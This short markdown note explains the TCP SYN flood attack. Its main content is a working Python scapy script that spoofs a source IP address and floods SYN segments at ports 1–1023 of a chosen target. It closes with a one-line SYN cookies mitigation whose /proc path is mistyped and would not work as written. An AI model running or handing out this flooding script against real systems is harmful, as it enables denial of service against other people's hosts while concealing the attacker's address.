# TCP SYN flood attack

## TCP three-way handshake

1. `SYN` segment;
2. `SYNACK` segment;
3. `ACK` segment;

## How to

send a lot of TCP SYN segments to the target.

### code

```py
#! /usr/bin/python3

import sys
from scapy.all import srflood, IP, TCP

if len(sys.argv) < 3:
    print(sys.argv[0] + ' <spoofed_source_ip> <target_ip>')
    sys.exit(0)

packet = IP(src=sys.argv[1], dst=sys.argv[2]) / \
    TCP(dport=range(1, 1024), flags="S")

srflood(packet)

```

## TODO: Enable SYN cookies to avoid SYN flood attack

```bash
echo 1 > /proc/sys/net/ipv4/tcp syncookies
```